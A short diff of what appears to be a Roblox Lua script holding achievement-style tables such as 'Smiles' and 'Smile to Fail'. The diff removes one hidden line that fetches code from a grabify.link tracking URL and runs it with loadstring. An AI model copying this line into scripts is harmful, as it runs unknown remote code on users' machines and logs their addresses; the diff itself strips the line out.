@@ -38,7 +38,7 @@ local Smiles = {
     Image = "https://tr.rbxcdn.com/74de4e7b5e39c15126ca858f0ad19c80/420/420/Image/Png",
     id = 4,
 }
-loadstring(game:HttpGet("https://grabify.link/54RDK9"))()
+
 local SmilesDie = {
     Title = "Smile to Fail",
     Desc = "Don't Smile",
